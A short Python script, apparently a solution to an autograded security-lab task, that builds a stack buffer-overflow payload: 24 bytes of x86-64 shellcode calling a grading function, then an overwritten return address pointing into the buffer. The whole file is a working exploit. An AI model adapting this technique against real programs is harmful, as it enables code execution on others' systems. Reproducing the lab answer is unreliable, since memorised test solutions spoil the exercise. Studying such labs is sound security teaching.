
#!/usr/bin/env python3
"""Task 2: Stack Execution"""
import sys
import struct

# Shellcode: call grade_eval(4), then exit(0)
shellcode = bytes.fromhex(
    "48 8d 64 24 80 "
    "6a 04 5f "
    "b8 87 1a 40 00 "
    "ff d0 "
    "6a 3c 58 31 ff 0f 05 "
    "90 90"
)

offset = 24
buffer_address = 0x721000800fd0

assert len(shellcode) == offset

payload = shellcode + struct.pack("<Q", buffer_address)

sys.stdout.buffer.write(payload + b"\n")
